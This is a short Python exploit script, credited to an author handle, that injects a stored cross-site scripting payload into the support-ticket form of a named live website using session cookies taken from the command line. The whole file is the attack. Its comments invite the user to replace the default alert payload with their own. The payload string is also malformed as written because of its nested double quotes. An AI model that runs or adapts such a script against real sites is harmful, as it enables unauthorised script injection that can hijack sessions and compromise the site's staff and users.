import sys
import requests


# https://anonstress.com Stored XSS Exploit
# Date: 09/25/21
# Author: 0x1CA3


class Exploit:
    def __init__(self, sesion_cookie, other_cookie):
        self.sesion_cookie = sesion_cookie
        self.other_cookie = other_cookie
        self.title_name = "XSS Exploit" # The name for the ticket | Note: You can change this.
        self.xss_payload = "<script>alert("xss")</script>" # Edit your own payload here if you would like.

    def run(self):
        site_cookies = {
            "31k001c": self.other_cookie,
            "fc_session": self.sesion_cookie
        }
        payload = {
            "n3k0t": self.other_cookie,
            "title": self.title_name,
            "status": "1",
            "details": self.xss_payload
        }
        s = requests.Session()
        s.post("https://anonstress.com/support/ticket/create", cookies=site_cookies, data=payload)

def main() -> None:
    if len(sys.argv) < 3:
        print("Usage: python3 exploit.py <fc_session_cookie> <31k001c_cookie>")
        sys.exit()
    sesion_cookie = sys.argv[1]
    other_cookie = sys.argv[2]
    Exploit(sesion_cookie, other_cookie).run()

if __name__ == "__main__":
    main()
